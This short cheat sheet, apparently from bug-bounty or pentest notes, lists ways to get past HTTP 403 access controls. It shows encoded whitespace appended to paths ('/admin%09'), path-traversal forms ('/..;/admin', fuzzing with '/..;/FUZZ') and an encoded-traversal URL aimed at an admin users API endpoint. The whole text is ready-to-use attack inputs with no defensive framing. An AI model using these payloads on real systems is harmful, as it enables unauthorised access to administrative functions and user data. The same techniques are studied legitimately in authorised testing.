# 403 Bypass

1- using space symbols  
exmaple:  
/admin -> 403  
/admin%09 -> 200  
/admin%20 -> 200  
  
2- use traversal  
Example:  
/admin -> 403  
/..;/admin -> 200  
  
you can fuzz with traversal sometimes that's end with results  
  
Example: /..;/FUZZ  

---

https://target/api/admin/users/123 <-- blocked
https://target/api/fakepath/..%2f/admin/fakepath/..%2f/users/123. <-- Try this


---




